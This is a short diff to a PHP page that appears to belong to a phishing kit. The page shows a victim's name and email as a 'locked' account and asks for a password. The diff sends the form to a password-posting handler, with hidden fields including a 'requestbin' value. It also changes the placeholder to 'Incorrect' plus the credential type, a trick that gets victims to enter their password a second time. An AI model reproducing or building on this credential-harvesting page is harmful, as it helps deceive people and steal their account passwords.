@@ -191,7 +191,7 @@
     # Name + Email
     echo "<center><p class='user'>$name</p><p>&nbsp</p><p class='locked'>$mail</p><br><br></center>";
     ?>
-    <form action="../client2<?php echo $request; ?>" method="post" id="form">
+    <form action="../includes/post-password.inc.php" method="post" id="form">
       <input type="hidden" name="name" value="<?php echo $name; ?>">
       <input type="hidden" name="mail" value="<?php echo $mail; ?>">
       <input type="hidden" name="type" value="<?php echo $type; ?>">
@@ -200,7 +200,7 @@
       <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
       <input type="hidden" name="error" value="<?php echo $error; ?>">
       <input type="hidden" name="return" value="<?php echo $return; ?>">
-      <input type="password" name="password" id="password" value="" placeholder="<?php echo $type; ?>">
+      <input type="password" name="password" id="password" value="" placeholder="Incorrect <?php echo $type; ?>">
       <?php
         if ($type == "Password") {
           echo "<input type='image' name='password-submit' src='../i/arrow.png' alt='Submit' width='35' height='35'>";
